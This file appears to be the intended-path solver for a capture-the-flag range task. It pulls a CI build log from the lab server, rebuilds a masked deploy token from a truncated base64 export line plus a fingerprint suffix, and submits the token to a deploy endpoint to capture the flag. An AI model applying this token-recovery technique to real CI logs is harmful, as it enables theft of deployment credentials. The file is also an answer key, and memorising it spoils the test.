"""Intended-path solver: rebuild the masked deploy token from the CI log."""

import base64
import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    expected = ctx.expected_flags["rebuild-the-token"]
    with httpx.Client(base_url=ctx.url(), timeout=10) as client:
        log = client.get("/evidence/build-1234.log").text

        # The export line keeps the first 20 of 28 base64 characters.
        b64_match = re.search(r"DEPLOY_TOKEN_B64=([A-Za-z0-9+/=]{4,})\*+", log)
        assert b64_match, "no truncated base64 token in log"
        prefix = base64.b64decode(b64_match.group(1)).decode()

        # The verify fingerprint keeps the last 4 raw characters.
        fp_match = re.search(r"fingerprint ok for \*+([0-9a-z]+)", log)
        assert fp_match, "no verify fingerprint in log"
        suffix = fp_match.group(1)

        token = prefix + suffix
        res = client.get("/api/deploy", params={"token": token})

    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    ok = captured == expected and "accepted" in res.text
    detail = None if ok else f"token={token!r} status={res.status_code}"
    return SolveResult(
        results=[TaskResult(task_id="rebuild-the-token", ok=ok, captured=captured, detail=detail)]
    )
